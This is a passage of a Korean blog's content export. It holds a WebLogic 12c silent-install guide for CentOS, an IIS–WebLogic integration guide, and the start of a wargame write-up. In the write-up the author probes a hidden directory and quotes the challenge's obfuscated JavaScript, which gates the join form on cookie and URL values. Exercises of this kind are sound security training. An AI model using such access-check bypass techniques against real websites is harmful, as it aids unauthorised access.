페이지</a>를 그대로 따라해도 좋다.</p>\n<p>하지만 폐쇄망 환경이라면 의존성 문제 등으로 Xwindow는 설치하기 까다로울 수 있다.\r\n콘솔 모드로 설치하는 것을 생각할 수 있는데, 12c 버전부터는 콘솔 모드를 지원하지 않는다.\r\n(<code class=\"language-text\">-mode=console</code>로 설치를 시도하면, 부적합한 인수라고 함..)</p>\n<p>대신 사일런트 모드를 사용할 수 있으므로, 사일런트 모드 설치과정을 기재하였다.</p>\n<h1>설치파일 다운로드</h1>\n<p><a href=\"https://www.oracle.com/middleware/technologies/fusionmiddleware-downloads.html\">Oracle</a>에서 Generic Installer 다운로드</p>\n<p><img src=\"./images/4.PNG\" alt=\"Oracle Weblogic\"></p>\n<p><img src=\"./images/5.PNG\" alt=\"Oracle Weblogic\"></p>\n<p>다음과 같은 압축파일이 다운받아진다</p>\n<p><img src=\"./images/6.PNG\" alt=\"Oracle Weblogic zipfile\"></p>\n<p>다운로드 받은 파일을 CentOS로 옮겨준다.</p>\n<p><img src=\"./images/7.PNG\" alt=\"zip file in CentOS\"></p>\n<h1>WebLogic 설치</h1>\n<p>압축을 풀어준다.</p>\n<p><img src=\"./images/8.PNG\" alt=\"unzip\"></p>\n<p>사일런트 모드가 아니라면 바로 설치를 진행할 수 있지만\r\n사일런트 모드로 설치하기 위해서는 사전에 생성해야 할 파일이 두 개가 있다.\r\n(사일런트 모드 설치 명령어는 다음과 같이 이루어진다.)</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">java</span> <span class=\"token parameter variable\">-jar</span> fmw_12.2.1.4.0_wls.jar <span class=\"token parameter variable\">-silent</span> <span class=\"token parameter variable\">-responseFile</span> <span class=\"token punctuation\">[</span>response 포인터 파일 절대경로<span class=\"token punctuation\">]</span> <span class=\"token parameter variable\">-invPtrLoc</span> <span class=\"token punctuation\">[</span>인벤토리 포인터 파일 절대경로<span class=\"token punctuation\">]</span></code></pre></div>\n<h2>Response file 생성</h2>\n<p><code class=\"language-text\">-responseFile</code> 옵션에 들어갈 파일을 생성해 주어야 한다.</p>\n<p>여기서 중요한 것은 ORACLE_HOME, INSTALL_TYPE, SECURITY_UPDATES_VIA_MYORACLESUPPORT 세가지 정도.\r\n각자의 환경에 맞게 써준다.</p>\n<p>출처: <a href=\"https://docs.oracle.com/middleware/1212/core/OUIRF/response_file.htm#OUIRF392\">오라클</a></p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\"><span class=\"token punctuation\">[</span>ENGINE<span class=\"token punctuation\">]</span>\r\n \r\n<span class=\"token comment\">#DO NOT CHANGE THIS.</span>\r\nResponse File <span class=\"token assign-left variable\">Version</span><span class=\"token operator\">=</span><span class=\"token number\">1.0</span>.0.0.0\r\n \r\n<span class=\"token punctuation\">[</span>GENERIC<span class=\"token punctuation\">]</span>\r\n \r\n<span class=\"token comment\">#The oracle home location. This can be an existing Oracle Home or a new Oracle Home</span>\r\n<span class=\"token assign-left variable\">ORACLE_HOME</span><span class=\"token operator\">=</span>/was/weblogic12c\r\n \r\n<span class=\"token comment\">#Set this variable value to the Installation Type selected. e.g. Fusion Middleware Infrastructure, Fusion Middleware Infrastructure With Examples.</span>\r\n<span class=\"token assign-left variable\">INSTALL_TYPE</span><span class=\"token operator\">=</span>WebLogic Server\r\n \r\n<span class=\"token comment\">#Provide the My Oracle Support Username. If you wish to ignore Oracle Configuration Manager configuration provide empty string for user name.</span>\r\n<span class=\"token assign-left variable\">MYORACLESUPPORT_USERNAME</span><span class=\"token operator\">=</span>\r\n \r\n<span class=\"token comment\">#Provide the My Oracle Support Password</span>\r\n<span class=\"token assign-left variable\">MYORACLESUPPORT_PASSWORD</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>SECURE VALUE<span class=\"token operator\">></span>\r\n \r\n<span class=\"token comment\">#Set this to true if you wish to decline the security updates. Setting this to true and providing empty string for My Oracle Support username will ignore the Oracle Configuration Manager configuration</span>\r\n<span class=\"token assign-left variable\">DECLINE_SECURITY_UPDATES</span><span class=\"token operator\">=</span>true\r\n \r\n<span class=\"token comment\">#Set this to true if My Oracle Support Password is specified</span>\r\n<span class=\"token assign-left variable\">SECURITY_UPDATES_VIA_MYORACLESUPPORT</span><span class=\"token operator\">=</span>false\r\n \r\n<span class=\"token comment\">#Provide the Proxy Host</span>\r\n<span class=\"token assign-left variable\">PROXY_HOST</span><span class=\"token operator\">=</span>\r\n \r\n<span class=\"token comment\">#Provide the Proxy Port</span>\r\n<span class=\"token assign-left variable\">PROXY_PORT</span><span class=\"token operator\">=</span>\r\n \r\n<span class=\"token comment\">#Provide the Proxy Username</span>\r\n<span class=\"token assign-left variable\">PROXY_USER</span><span class=\"token operator\">=</span>\r\n \r\n<span class=\"token comment\">#Provide the Proxy Password</span>\r\n<span class=\"token assign-left variable\">PROXY_PWD</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>SECURE VALUE<span class=\"token operator\">></span>\r\n \r\n<span class=\"token comment\">#Type String (URL format) Indicates the OCM Repeater URL which should be of the format [scheme[Http/Https]]://[repeater host]:[repeater port]</span>\r\n<span class=\"token assign-left variable\">COLLECTOR_SUPPORTHUB_URL</span><span class=\"token operator\">=</span></code></pre></div>\n<p>ORACLE_HOME에 해당되는 디렉토리는 따로 직접 생성해 준다.</p>\n<p>.rsp 형태로 파일명을 지정해준다.</p>\n<p><img src=\"./images/9.PNG\" alt=\"naming rsp file\"></p>\n<p><img src=\"./images/10.PNG\" alt=\"making rsp file\"></p>\n<p><img src=\"./images/11.PNG\" alt=\"making oracle_home\"></p>\n<h2>인벤토리 포인터 파일 생성</h2>\n<p><code class=\"language-text\">-invPtrLoc</code> 옵션에 들어갈 파일도 필요하다.\r\n이 파일의 이름은 oraInst.loc이어야 한다.\r\n이를 아래와 같이 작성해 준다.</p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\"><span class=\"token assign-left variable\">inventory_loc</span><span class=\"token operator\">=</span>/was/oraInventory\r\n<span class=\"token assign-left variable\">inst_group</span><span class=\"token operator\">=</span>weblogic</code></pre></div>\n<p>oraInventory는 오라클 제품군 설치 시 필요한 파일들이 들어 있는 디렉토리이다.\r\n설치 시 디렉토리 째로 생성된다. 위의 inventory_loc 뒤에 이 oraInventory가 생성될 경로를 입력해 준다.</p>\n<p><img src=\"./images/12.PNG\" alt=\"naming loc file\"></p>\n<p><img src=\"./images/13.PNG\" alt=\"making loc file\"></p>\n<p>이제 설치해 준다.</p>\n<p><img src=\"./images/14.PNG\" alt=\"Install silent mode\"></p>\n<p>위에서 지정해준 ORACLE_HOME 위치에 파일들이 생성된 것을 볼 수 있다.</p>\n<p><img src=\"./images/15.PNG\" alt=\"ORACLE_HOME\"></p>\n<hr>\n<h1>도메인 구성 &#x26; Admin server 생성</h1>\n<p><code class=\"language-text\">$ORACLE_HOME/wlserver/common/bin</code>으로 진입한다.</p>\n<p><img src=\"./images/16.PNG\" alt=\"common\"></p>\n<p>wlst.sh를 발견할 수 있다.</p>\n<p>wlst는 WebLogic Scripting Tool이라고 한다.</p>\n<p>이 쉘파일을 실행시킨다.</p>\n<p><img src=\"./images/17.PNG\" alt=\"wlst.sh\"></p>\n<p>deprecated script라며 oracle_common/common/bin에 있는 wlst.sh를 실행하라고 하지만 현재의 스크립트로 설치를 진행한다.</p>\n<p><img src=\"./images/18.PNG\" alt=\"read template\"></p>\n<p>위의 명령어를 실행시킨다.\r\n(oracle_common/common/bin에 있는 wlst.sh로 이를 진행하면 템플릿을 찾지 못해 설치가 진행되지 않는다)</p>\n<p>명령어 라인에 base_domain이 생긴 것을 볼 수 있다.\r\n이렇게 기본 생성된 도메인 이름은 나중에 변경할 수 있다.</p>\n<p>이제 서버 기동 및 콘솔 접근에 필요한 관리자 계정을 생성해 준다.</p>\n<p><img src=\"./images/19.PNG\" alt=\"make admin\"></p>\n<p>이 weblogic을 운영모드로 운용하려면 다음과 같이 설정해 준다.</p>\n<p><img src=\"./images/20.PNG\" alt=\"set Production mode\"></p>\n<p>Admin server의 이름, 포트를 바꾸려면 아래와 같이 입력한다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">cd('Servers/AdminServer')\r\nset('Name', '[new name]')\r\nset('ListenPort', 7001)\r\nset('ListenAddress', 'All Local Addresses')</code></pre></div>\n<p>ListenAddress를 위의 설정대로 해주지 않으면 가능한 모든 IP를 사용하게 된다.</p>\n<p>이제 기본 적용된 도메인 이름 base_domain을 다른 이름으로 바꿔줄 것이다.</p>\n<p><img src=\"./images/21.PNG\" alt=\"rename domain\"></p>\n<p>설정을 마쳤으면 <code class=\"language-text\">closeTemplate()</code>, <code class=\"language-text\">exit()</code>으로 종료해준다.</p>\n<p>위에서 사용했던 wlst 내의 모든 명령어들을 모아 파이썬 스크립트 파일로 생성해서 한번에 설정할 수도 있다.\r\n생성한 스크립트 파일이 /tmp/setwl.py라면,</p>\n<p><code class=\"language-text\">wlst.sh /tmp/setwl.py</code> 이런식으로 실행시키면 된다.</p>\n<p>편의를 위해 .bash_profile에서 환경변수를 추가한다.</p>\n<p><img src=\"./images/22.PNG\" alt=\"DOMAIN_HOME\"></p>\n<p><code class=\"language-text\">. .bash_profile</code>로 적용해 준다.</p>\n<hr>\n<h1>Web Console을 이용하기 위한 설정</h1>\n<p>현재 설정중인 서버 내부에서 web console 컨트롤 전용 7001번 포트는 이미 열려있는 상태이다.\r\n하지만 해당 서버를 원격 터미널을 통해 컨트롤하고 있는 상황이라면 서버 내부 포트 7001과 외부 포트를 연결시켜 주어야 7001 웹 콘솔을 볼 수 있다.</p>\n<p>(방화벽에서 포트 오픈)[<a href=\"https://s01va.github.io/iptables-port-forwarding/\">https://s01va.github.io/iptables-port-forwarding/</a>]</p>\n<p>root로 계정을 바꾼 후 설정하였다.</p>\n<p><img src=\"./images/23.PNG\" alt=\"iptables\"></p>\n<p><img src=\"./images/20.PNG\" alt=\"\">\r\n<img src=\"./images/20.PNG\" alt=\"\">\r\n<img src=\"./images/20.PNG\" alt=\"\">\r\n<img src=\"./images/20.PNG\" alt=\"\">\r\n<img src=\"./images/20.PNG\" alt=\"\">\r\n<img src=\"./images/20.PNG\" alt=\"\">\r\n<img src=\"./images/30.PNG\" alt=\"\"></p>","categories":["misc","setting"],"date":"March 09, 2020","description":"WebLogic 12.2.1.4.0","id":"ccb4cf15-96e7-50c6-b95a-a6a8c30f2665","keywords":["was","middleware","weblogic","centos"],"slug":"/in-CentOS7-WebLogic12c-Install/","title":"CentOS7에서 WebLogic 12c 설치하기","readingTime":{"text":"9 min read"}},{"banner":{"alt":null,"caption":null,"src":null},"body":"<p><a href=\"https://s01va.github.io/Windows-10%EC%97%90%EC%84%9C-WebLogic-12c-%EC%84%A4%EC%B9%98%ED%95%98%EA%B8%B0/\">WebLogic 설치</a> 이후 과정이다.</p>\n<h2>IIS 설치</h2>\n<p>제어판 - 모든 제어판 항목 - 프로그램 및 기능으로 들어간다.</p>\n<p><img src=\"./images/0.PNG\" alt=\"controlpannel-program\"></p>\n<p>좌측 상단에 있는 Windows 기능 켜기/끄기를 눌러 Windows 기능 창을 연다.</p>\n<p><img src=\"./images/1.PNG\" alt=\"IIS start\"></p>\n<p><img src=\"./images/2.PNG\" alt=\"IIS start2\"></p>\n<p><img src=\"./images/3.PNG\" alt=\"IIS start3\"></p>\n<p>스크롤을 쭉쭉 내리면 '인터넷 정보 서비스'를 발견할 수 있다. 이를 체크해 준다.\r\n설치가 완료되면 IIS를 실행시켜 준다.\r\n(윈도우 시작 창에서 IIS를 검색하면 찾을 수 있다)</p>\n<p><img src=\"./images/4.PNG\" alt=\"IIS\"></p>\n<p>IIS의 첫 화면이다. 사이트에 우클릭해서 웹 사이트 추가를 눌러준다.</p>\n<p><img src=\"./images/5.PNG\" alt=\"add website\"></p>\n<p>사이트 추가를 해준다.\r\n80번 포트를 사용하고 싶으면 Default Web Site를 지우거나 정지시킨다.\r\n정지시킬 때는 응용 프로그램 풀에서도 정지시켜 주어야 한다.</p>\n<p><img src=\"./images/6.PNG\" alt=\"virtual directory\"></p>\n<p>생성한 웹사이트를 우클릭해서 가상 디렉토리를 생성한다.</p>\n<h3>★주의할 점</h3>\n<p>예를 들어 기존에 <a href=\"http://localhost/webtest%EB%A1%9C\">http://localhost/webtest로</a> 접속해야 하는 서비스라면\r\n가상 디렉토리를 webtest로 생성해 주어야 한다.\r\n혼동을 피하기 위해 IIS 전용으로 생성한 폴더 내부에 webtest라는 폴더를 새로 생성하여 실제 경로로 지정하였다.</p>\n<h2>WebLogic - IIS Plugin 다운로드</h2>\n<p><a href=\"https://www.oracle.com/middleware/technologies/webtier-downloads.html#server3\">여기</a>에서 플러그인을 다운받는다.</p>\n<p><img src=\"./images/7.PNG\" alt=\"plugin download\"></p>\n<p><img src=\"./images/8.PNG\" alt=\"plugin download2\"></p>\n<p>이후 오라클 로그인을 하면 한 압축파일이 다운받아진다.</p>\n<p><img src=\"./images/9.PNG\" alt=\"zip\"></p>\n<p>압축파일의 내부이다. 모든 웹서버에 대한 플러그인이 모두 들어있다. 이 중 IIS-Win64에 해당되는 플러그인을 선택해 압축을 해제한다.</p>\n<p><img src=\"./images/10.PNG\" alt=\"dlls\"></p>\n<p>플러그인 폴더의 lib 내부에 아래와 같은 dll 파일들이 존재하는 것을 확인할 수 있다.</p>\n<h2>WebLogic - IIS 연동</h2>\n<p>이전 단계에서 다운받은 dll 파일들을 전부 가져온다.</p>\n<p><img src=\"./images/11.PNG\" alt=\"wlplugin\"></p>\n<p>IIS 전용으로 생성한 폴더 내에 연동 플러그인 전용 폴더를 생성하여 dll들을 전부 복붙해 주었다.</p>\n<p><img src=\"./images/12.PNG\" alt=\"처리기 매핑\"></p>\n<p>IIS로 돌아가서 이전에 만든 가상 디렉토리 창에서 처리기 매핑을 찾는다.</p>\n<p><img src=\"./images/13.PNG\" alt=\"script mapping\"></p>\n<p>스크립트 매핑을 클릭한다.</p>\n<p><img src=\"./images/14.PNG\" alt=\"add dll\"></p>\n<p>위와 같이 입력해 준다. 실행 파일은 복붙해온 dll 파일들 중에서 찾는다.</p>\n<p>그리고 요청 제한을 클린한다.</p>\n<p><img src=\"./images/15.PNG\" alt=\"mapping\"></p>\n<p><img src=\"./images/16.PNG\" alt=\"verb\"></p>\n<p><img src=\"./images/17.PNG\" alt=\"access\"></p>\n<p>위와 같이 설정해 준다. 그대로 확인-확인-예 해준다.</p>\n<p><img src=\"./images/18.PNG\" alt=\"add iisproxy\"></p>\n<p>성공적으로 추가한 것을 볼 수 있다.</p>\n<p>이외에도 생성해야 할 파일이 있다. dll파일을 복붙한 폴더로 이동한 후 아래와 같은 이름의 파일을 생성한다.</p>\n<p><img src=\"./images/19.PNG\" alt=\"make iisproxy.ini\"></p>\n<p>아래와 같은 형식으로 작성한다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token assign-left variable\">WebLogicCluster</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span>Host<span class=\"token punctuation\">]</span>:<span class=\"token punctuation\">[</span>Port<span class=\"token punctuation\">]</span></code></pre></div>\n<p><img src=\"./images/20.PNG\" alt=\"iisproxy.ini\"></p>\n<p>다음은 위에서 생성한 가상 디렉토리에 대응하는 실제 디렉토리로 들어가서 index.html을 생성해 준다.</p>\n<p><img src=\"./images/21.PNG\" alt=\"index.html\"></p>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\r\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\r\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\r\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\r\n\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"/webtest\"</span><span class=\"token punctuation\">;</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\r\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<p>생성한 index.html에 위의 내용을 작성하였다. /webtest 부분은 각자 설정에 맞게 바꾼다.</p>\n<p><img src=\"./images/22.PNG\" alt=\"\"></p>\n<p>성공적으로 연동된 것을 볼 수 있다.</p>\n<h2>추가</h2>\n<p>컴퓨터에 따라 간혹 오류코드 0x8007007e(500번 오류)가 뜨기도 한다.</p>\n<p>이럴 때는 <a href=\"https://www.microsoft.com/en-us/download/details.aspx?id=30679\">마이크로소프트 페이지</a>에서 vc++ 런타임을 다운로드 받고 설치해 주면 해결된다.</p>","categories":["misc","setting"],"date":"February 21, 2020","description":null,"id":"d008d5fd-f9ae-5cb6-85f6-2bd75538a096","keywords":["was","weblogic","iis","middleware"],"slug":"/Windows-10-IIS-with-WebLogic-12c/","title":"Windows 10 IIS와 WebLogic 12c 연동하기","readingTime":{"text":"5 min read"}},{"banner":{"alt":null,"caption":null,"src":null},"body":"<p><img src=\"./images/0.PNG\" alt=\"05\"></p>\n<p>login / join이 있다.</p>\n<p><img src=\"./images/1.PNG\" alt=\"join_denied\"></p>\n<p>join은 접근이 되지 않는다.</p>\n<p><img src=\"./images/2.PNG\" alt=\"login\"></p>\n<p>login 화면은 위와 같이 뜬다.</p>\n<p><img src=\"./images/3.PNG\" alt=\"try_login\"></p>\n<p><img src=\"./images/4.PNG\" alt=\"login failed\"></p>\n<p>위처럼 입력했더니 wrong password라고 뜬다. html 코드나 쿠키 등은 별 특이사항이 없었다.</p>\n<p>URL이 기존 문제들처럼 /web-[문제번호]/ 뒤에 /mem/ + login.php의 형태로 이루어져 있어\r\nlogin.php를 지운 /web-05/mem/으로 접속을 시도해 보았다.</p>\n<p><img src=\"./images/5.PNG\" alt=\"mem\"></p>\n<p>접속이 가능한 것을 볼 수 있다. 여기에서 join.php를 열어보는 시도를 해 보았다.</p>\n<p><img src=\"./images/6.PNG\" alt=\"bye\"></p>\n<p>이전과는 다르게 bye라는 알림창을 띄운다. 여기에서 html을 확인해 보았다.</p>\n<p><img src=\"./images/7.PNG\" alt=\"html\"></p>\n<p>위의 코드 중 <code class=\"language-text\">&lt;script></code> 파트만 가져와서 보면 아래와 같다.</p>\n<div class=\"gatsby-highlight\" data-language=\"js\"><pre class=\"language-js\"><code class=\"language-js\">\r\nl<span class=\"token operator\">=</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">;</span>\r\nll<span class=\"token operator\">=</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">;</span>\r\nlll<span class=\"token operator\">=</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">;</span>\r\nllll<span class=\"token operator\">=</span><span class=\"token string\">'d'</span><span class=\"token punctuation\">;</span>\r\nlllll<span class=\"token operator\">=</span><span class=\"token string\">'e'</span><span class=\"token punctuation\">;</span>\r\nllllll<span class=\"token operator\">=</span><span class=\"token string\">'f'</span><span class=\"token punctuation\">;</span>\r\nlllllll<span class=\"token operator\">=</span><span class=\"token string\">'g'</span><span class=\"token punctuation\">;</span>\r\nllllllll<span class=\"token operator\">=</span><span class=\"token string\">'h'</span><span class=\"token punctuation\">;</span>\r\nlllllllll<span class=\"token operator\">=</span><span class=\"token string\">'i'</span><span class=\"token punctuation\">;</span>\r\nllllllllll<span class=\"token operator\">=</span><span class=\"token string\">'j'</span><span class=\"token punctuation\">;</span>\r\nlllllllllll<span class=\"token operator\">=</span><span class=\"token string\">'k'</span><span class=\"token punctuation\">;</span>\r\nllllllllllll<span class=\"token operator\">=</span><span class=\"token string\">'l'</span><span class=\"token punctuation\">;</span>\r\nlllllllllllll<span class=\"token operator\">=</span><span class=\"token string\">'m'</span><span class=\"token punctuation\">;</span>\r\nllllllllllllll<span class=\"token operator\">=</span><span class=\"token string\">'n'</span><span class=\"token punctuation\">;</span>\r\nlllllllllllllll<span class=\"token operator\">=</span><span class=\"token string\">'o'</span><span class=\"token punctuation\">;</span>\r\nllllllllllllllll<span class=\"token operator\">=</span><span class=\"token string\">'p'</span><span class=\"token punctuation\">;</span>\r\nlllllllllllllllll<span class=\"token operator\">=</span><span class=\"token string\">'q'</span><span class=\"token punctuation\">;</span>\r\nllllllllllllllllll<span class=\"token operator\">=</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">;</span>\r\nlllllllllllllllllll<span class=\"token operator\">=</span><span class=\"token string\">'s'</span><span class=\"token punctuation\">;</span>\r\nllllllllllllllllllll<span class=\"token operator\">=</span><span class=\"token string\">'t'</span><span class=\"token punctuation\">;</span>\r\nlllllllllllllllllllll<span class=\"token operator\">=</span><span class=\"token string\">'u'</span><span class=\"token punctuation\">;</span>\r\nllllllllllllllllllllll<span class=\"token operator\">=</span><span class=\"token string\">'v'</span><span class=\"token punctuation\">;</span>\r\nlllllllllllllllllllllll<span class=\"token operator\">=</span><span class=\"token string\">'w'</span><span class=\"token punctuation\">;</span>\r\nllllllllllllllllllllllll<span class=\"token operator\">=</span><span class=\"token string\">'x'</span><span class=\"token punctuation\">;</span>\r\nlllllllllllllllllllllllll<span class=\"token operator\">=</span><span class=\"token string\">'y'</span><span class=\"token punctuation\">;</span>\r\nllllllllllllllllllllllllll<span class=\"token operator\">=</span><span class=\"token string\">'z'</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token constant\">I</span><span class=\"token operator\">=</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token constant\">II</span><span class=\"token operator\">=</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token constant\">III</span><span class=\"token operator\">=</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token constant\">IIII</span><span class=\"token operator\">=</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token constant\">IIIII</span><span class=\"token operator\">=</span><span class=\"token string\">'5'</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token constant\">IIIIII</span><span class=\"token operator\">=</span><span class=\"token string\">'6'</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token constant\">IIIIIII</span><span class=\"token operator\">=</span><span class=\"token string\">'7'</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token constant\">IIIIIIII</span><span class=\"token operator\">=</span><span class=\"token string\">'8'</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token constant\">IIIIIIIII</span><span class=\"token operator\">=</span><span class=\"token string\">'9'</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token constant\">IIIIIIIIII</span><span class=\"token operator\">=</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">;</span>\r\nli<span class=\"token operator\">=</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">;</span>\r\nii<span class=\"token operator\">=</span><span class=\"token string\">'&lt;'</span><span class=\"token punctuation\">;</span>\r\niii<span class=\"token operator\">=</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">;</span>\r\nlIllIllIllIllIllIllIllIllIllIl<span class=\"token operator\">=</span>lllllllllllllll<span class=\"token operator\">+</span>llllllllllll<span class=\"token operator\">+</span>llll<span class=\"token operator\">+</span>llllllllllllllllllllllllll<span class=\"token operator\">+</span>lllllllllllllll<span class=\"token operator\">+</span>lllllllllllll<span class=\"token operator\">+</span>ll<span class=\"token operator\">+</span>lllllllll<span class=\"token operator\">+</span>lllll<span class=\"token punctuation\">;</span>\r\n\r\nlIIIIIIIIIIIIIIIIIIl<span class=\"token operator\">=</span>llll<span class=\"token operator\">+</span>lllllllllllllll<span class=\"token operator\">+</span>lll<span class=\"token operator\">+</span>lllllllllllllllllllll<span class=\"token operator\">+</span>lllllllllllll<span class=\"token operator\">+</span>lllll<span class=\"token operator\">+</span>llllllllllllll<span class=\"token operator\">+</span>llllllllllllllllllll<span class=\"token operator\">+</span>li<span class=\"token operator\">+</span>lll<span class=\"token operator\">+</span>lllllllllllllll<span class=\"token operator\">+</span>lllllllllllllll<span class=\"token operator\">+</span>lllllllllll<span class=\"token operator\">+</span>lllllllll<span class=\"token operator\">+</span>lllll<span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>lIIIIIIIIIIIIIIIIIIl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>lIllIllIllIllIllIllIllIllIllIl<span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n\t<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">'bye'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\t<span class=\"token keyword\">throw</span> <span class=\"token string\">\"stop\"</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>llll<span class=\"token operator\">+</span>lllllllllllllll<span class=\"token operator\">+</span>lll<span class=\"token operator\">+</span>lllllllllllllllllllll<span class=\"token operator\">+</span>lllllllllllll<span class=\"token operator\">+</span>lllll<span class=\"token operator\">+</span>llllllllllllll<span class=\"token operator\">+</span>llllllllllllllllllll<span class=\"token operator\">+</span>li<span class=\"token operator\">+</span><span class=\"token string\">'U'</span><span class=\"token operator\">+</span><span class=\"token string\">'R'</span><span class=\"token operator\">+</span><span class=\"token string\">'L'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>lllllllllllll<span class=\"token operator\">+</span>lllllllllllllll<span class=\"token operator\">+</span>llll<span class=\"token operator\">+</span>lllll<span class=\"token operator\">+</span><span class=\"token string\">'='</span><span class=\"token operator\">+</span><span class=\"token constant\">I</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n\t<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">'access_denied'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\t<span class=\"token keyword\">throw</span> <span class=\"token string\">\"stop\"</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\r\n\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;font size=2 color=white>Join&lt;/font>&lt;p>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">'.&lt;p>.&lt;p>.&lt;p>.&lt;p>.&lt;p>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;form method=post action='</span><span class=\"token operator\">+</span>llllllllll<span class=\"token operator\">+</span>lllllllllllllll<span class=\"token operator\">+</span>lllllllll<span class=\"token operator\">+</span>llllllllllllll<span class=\"token operator\">+</span>li<span class=\"token operator\">+</span>llllllllllllllll<span class=\"token operator\">+</span>llllllll<span class=\"token operator\">+</span>llllllllllllllll\r\n<span class=\"token operator\">+</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;table border=1>&lt;tr>&lt;td>&lt;font color=gray>id&lt;/font>&lt;/td>&lt;td>&lt;input type=text name='</span><span class=\"token operator\">+</span>lllllllll<span class=\"token operator\">+</span>llll<span class=\"token operator\">+</span><span class=\"token string\">' maxlength=20>&lt;/td>&lt;/tr>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;tr>&lt;td>&lt;font color=gray>pass&lt;/font>&lt;/td>&lt;td>&lt;input type=text name='</span><span class=\"token operator\">+</span>llllllllllllllll<span class=\"token operator\">+</span>lllllllllllllllllllllll<span class=\"token operator\">+</span><span class=\"token string\">'>&lt;/td>&lt;/tr>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;tr align=center>&lt;td 